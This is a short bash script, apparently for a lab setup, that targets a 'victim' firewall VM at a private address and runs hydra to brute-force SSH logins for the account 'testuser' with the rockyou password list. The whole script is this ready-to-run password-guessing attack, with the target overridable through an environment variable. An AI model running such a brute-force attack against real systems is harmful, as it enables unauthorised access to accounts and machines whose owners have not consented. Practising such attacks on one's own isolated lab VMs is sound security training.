#!/usr/bin/env bash
set -euo pipefail

VICTIM_IP="${VICTIM_IP:-192.168.56.10}"
echo "Target firewall VM: ${VICTIM_IP} (override with VICTIM_IP=<ip>)"

hydra -l testuser -P /usr/share/wordlists/rockyou.txt -t 4 ssh://"${VICTIM_IP}" -f -V || true
